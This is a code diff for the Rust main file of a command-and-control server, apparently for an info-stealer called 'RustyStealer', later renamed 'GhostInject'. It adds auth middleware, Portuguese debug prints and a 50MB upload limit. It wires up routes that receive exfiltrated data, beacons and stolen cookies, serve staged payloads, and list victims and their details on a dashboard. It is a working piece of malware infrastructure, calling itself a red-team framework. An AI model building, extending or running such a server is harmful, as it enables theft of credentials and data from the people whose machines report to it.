@@ -1,30 +1,33 @@
 mod config;
 mod handlers;
 mod database;
-mod crypto;
 mod models;
+mod auth;
 
 use axum::{
     Router,
     routing::{get, post},
-    extract::State,
+    extract::DefaultBodyLimit,  // ADICIONADO!
     http::{
         header::{CONTENT_TYPE, AUTHORIZATION},
-        Method, HeaderValue,
+        HeaderName,
+        Method,
     },
-    response::{IntoResponse, Json},
+    response::Json,
+    middleware,
 };
 use tower_http::{
     cors::{CorsLayer, Any},
     trace::TraceLayer,
 };
 use std::sync::Arc;
-use tracing::{info, error};
+use tracing::info;
 use tracing_subscriber;
 
 use config::Config;
 use database::Database;
 use handlers::*;
+use auth::{auth_middleware, login_handler};
 
 #[derive(Clone)]
 pub struct AppState {
@@ -34,104 +37,127 @@ pub struct AppState {
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+    println!("=== DEBUG MAIN ===");
+    println!("1. Iniciando servidor...");
+    println!("2. Diretório atual: {:?}", std::env::current_dir());
+    
     // Setup logging
+    println!("3. Configurando logging...");
     tracing_subscriber::fmt()
         .with_target(false)
         .with_thread_ids(true)
         .init();
     
-    info!("🚀 Starting C2 Server...");
-    
-    // Load config
-    let config = Config::load()?;
+    println!("4. Carregando configuração...");
+    // Load configuration
+    let config = match Config::load() {
+        Ok(c) => {
+            println!("   Config carregada com sucesso");
+            c
+        },
+        Err(e) => {
+            println!("   ERRO ao carregar config: {}", e);
+            return Err(e.into());
+        }
+    };
     info!("📁 Config loaded: {}:{}", config.server.host, config.server.port);
+    println!("5. Server: {}:{}", config.server.host, config.server.port);
+    println!("6. Database URL: {}", config.database.url);
+    println!("7. Log file: {}", config.logging.file);
     
+    println!("8. Inicializando banco de dados...");
     // Initialize database
-    let db = Database::new(&config.database.path).await?;
-    info!("💾 Database initialized at: {}", config.database.path);
+    let db = match Database::new(&config.database.url).await {
+        Ok(d) => {
+            println!("   Banco de dados conectado com sucesso");
+            d
+        },
+        Err(e) => {
+            println!("   ERRO ao conectar banco: {}", e);
+            return Err(e);
+        }
+    };
+    info!("💾 Database initialized");
     
+    println!("9. Criando AppState...");
     // Create app state
     let state = AppState {
         db: Arc::new(db),
         config: Arc::new(config),
     };
     
-    // Setup CORS
-    let cors = CorsLayer::new()
-        .allow_methods([Method::GET, Method::POST])
-        .allow_origin(Any)
-        .allow_headers([CONTENT_TYPE, AUTHORIZATION]);
+    let shared_state = Arc::new(state);
     
-    // Build router
+    println!("10. Configurando CORS...");
+    // CORS configuration
+    let cors = CorsLayer::new()
+        .allow_methods([Method::GET, Method::POST, Method::OPTIONS])
+        .allow_origin(Any)
+        .allow_headers([CONTENT_TYPE, AUTHORIZATION, HeaderName::from_static("x-api-key")]);
+    
+    println!("11. Construindo rotas...");
+    // Build router with middleware stack
     let app = Router::new()
-        // API endpoints
+        // Public routes (no auth)
         .route("/", get(root_handler))
         .route("/health", get(health_handler))
+        .route("/login", post(login_handler))
+        
+        // Protected routes (API Key required for agents)
         .route("/exfil", post(exfil_handler))
-        .route("/exfil/:id", get(get_exfil_handler))
         .route("/beacon", post(beacon_handler))
+        .route("/cookies", post(cookies_handler))
+        
+        // Protected routes (JWT required for dashboard)
         .route("/payload/:stage", get(payload_handler))
         .route("/victims", get(victims_handler))
         .route("/victim/:id", get(victim_details_handler))
-        
-        // Dashboard (web UI)
+        .route("/exfil/:id", get(get_exfil_handler))
+        .route("/exfil/raw/:id", get(get_raw_exfil_handler))  // NOVA ROTA!
         .route("/dashboard", get(dashboard_handler))
-        .route("/static/*path", get(static_handler))
         
+        // Apply auth middleware
+        .layer(middleware::from_fn_with_state(
+            shared_state.clone(),
+            auth_middleware,
+        ))
+        // ADICIONADO: Aumenta o limite de body para 50MB
+        .layer(DefaultBodyLimit::max(50 * 1024 * 1024))  // 50MB
         .layer(cors)
         .layer(TraceLayer::new_for_http())
-        .with_state(state);
+        .with_state(shared_state.clone());
     
+    println!("12. Iniciando servidor...");
     // Start server
-    let addr = format!("{}:{}", state.config.server.host, state.config.server.port);
+    let addr = format!("{}:{}", shared_state.config.server.host, shared_state.config.server.port);
+    println!("=== FIM DEBUG ===");
     info!("🌐 Listening on http://{}", addr);
+    info!("📊 Dashboard: http://{}/dashboard", addr);
+    info!("🔐 Login: http://{}/login", addr);
+    info!("🔍 Raw exfil: http://{}/exfil/raw/{{id}}", addr);
     
-    if state.config.server.tls_enabled {
-        // HTTPS (produção)
-        let rustls_config = setup_tls(&state.config).await?;
-        axum_server::bind_rustls(addr.parse()?, rustls_config)
-            .serve(app.into_make_service())
-            .await?;
-    } else {
-        // HTTP (desenvolvimento/lab)
-        let listener = tokio::net::TcpListener::bind(addr).await?;
-        axum::serve(listener, app).await?;
-    }
+    let listener = tokio::net::TcpListener::bind(addr).await?;
+    axum::serve(listener, app).await?;
     
     Ok(())
 }
 
+// ============================================================
+// PUBLIC HANDLERS
+// ============================================================
+
 async fn root_handler() -> &'static str {
-    "C2 Server Online - Operation RustyStealer"
+    "GhostInject C2 Server Online — Red Team Framework"
 }
 
 async fn health_handler() -> Json<serde_json::Value> {
     Json(serde_json::json!({
         "status": "healthy",
+        "version": env!("CARGO_PKG_VERSION"),
         "timestamp": chrono::Utc::now().to_rfc3339(),
+        "services": {
+            "database": "connected",
+            "api": "operational"
+        }
     }))
-}
-
-async fn setup_tls(config: &Config) -> anyhow::Result<rustls::ServerConfig> {
-    use rustls_pemfile::{certs, pkcs8_private_keys};
-    use std::fs::File;
-    use std::io::BufReader;
-    
-    let cert_file = &mut BufReader::new(File::open(&config.server.cert_file)?);
-    let key_file = &mut BufReader::new(File::open(&config.server.key_file)?);
-    
-    let cert_chain = certs(cert_file)
-        .unwrap()
-        .into_iter()
-        .map(rustls::Certificate)
-        .collect();
-    
-    let mut keys = pkcs8_private_keys(key_file).unwrap();
-    let private_key = rustls::PrivateKey(keys.remove(0));
-    
-    let config = rustls::ServerConfig::builder()
-        .with_no_client_auth()
-        .with_single_cert(cert_chain, private_key)?;
-    
-    Ok(config)
 }
